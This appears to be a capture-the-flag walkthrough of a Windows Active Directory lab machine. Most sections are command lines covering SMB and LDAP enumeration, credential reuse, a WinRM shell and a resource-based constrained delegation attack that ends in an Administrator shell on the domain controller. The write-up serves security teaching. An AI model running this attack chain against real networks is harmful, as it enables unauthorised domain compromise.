# 🎫 Support

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Support](https://tryhackme.com/room/support) |
| **Difficulty** | 🟡 Medium |
| **Category** | Active Directory |
| **OS** | Windows |
| **Tools** | nmap, ldapsearch, BloodHound, evil-winrm, Rubeus |

---

## 🎯 Objective

Compromise a Windows Active Directory machine by exploiting LDAP credential exposure and abusing GenericAll permissions.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 TARGET_IP
```

**Open ports:**
```
53/tcp   DNS
88/tcp   Kerberos
135/tcp  RPC
139/tcp  NetBIOS
389/tcp  LDAP
445/tcp  SMB
464/tcp  Kpasswd
593/tcp  RPC over HTTP
636/tcp  LDAPS
3268/tcp Global Catalog
5985/tcp WinRM
```

Add to `/etc/hosts`:
```
TARGET_IP  support.htb dc.support.htb
```

---

## 🌐 SMB Enumeration

```bash
smbclient -L //support.htb -N
```

**Found:** `support-tools` share accessible without credentials:
```bash
smbclient //support.htb/support-tools -N
ls
get UserInfo.exe.zip
```

Analysing `UserInfo.exe` — a .NET binary that queries LDAP:
```bash
# Decompile with ILSpy or dotPeek
# Found hardcoded LDAP credentials in the binary
# Encoded password decoded reveals: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## 📁 LDAP Enumeration

```bash
ldapsearch -x -H ldap://support.htb \
  -D "support\ldap" -w "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" \
  -b "DC=support,DC=htb" "(objectClass=user)" | grep -i "description\|sAMAccountName"
```

**Found:** User `support` has password in the Description field:
```
description: Ironside47pleasure40Watchful
```

---

## 💥 Exploitation

```bash
evil-winrm -i support.htb -u support -p "Ironside47pleasure40Watchful"
# Shell as support user
```

**User flag obtained.**

---

## 🔐 Privilege Escalation

Running BloodHound:
```bash
bloodhound-python -u support -p "Ironside47pleasure40Watchful" \
  -ns support.htb -d support.htb -c all
```

BloodHound reveals: `support` has **GenericAll** over the Domain Controller computer object.

**Resource-Based Constrained Delegation (RBCD) attack:**
```bash
# Create fake computer account
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Password123!' \
  -dc-ip support.htb support.htb/support:'Ironside47pleasure40Watchful'

# Set RBCD
rbcd.py -f FAKE$ -t DC$ -dc-ip support.htb \
  support.htb/support:'Ironside47pleasure40Watchful' -action write

# Get service ticket for Administrator
getST.py -spn cifs/dc.support.htb -impersonate Administrator \
  -dc-ip support.htb 'support.htb/FAKE$:Password123!'

# Use ticket to access DC
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass dc.support.htb
```

**Root flag obtained.**

---

## 📚 Lessons Learned

- Credentials hardcoded in binaries are a critical vulnerability — decompile any custom executables found
- Description fields in AD are readable by all authenticated users — never store passwords there
- GenericAll is one of the most dangerous AD permissions — map it with BloodHound immediately
- RBCD attacks allow privilege escalation via machine account manipulation without needing a privileged account

---
*by OwlRC 🦉 | github.com/OwlRC*
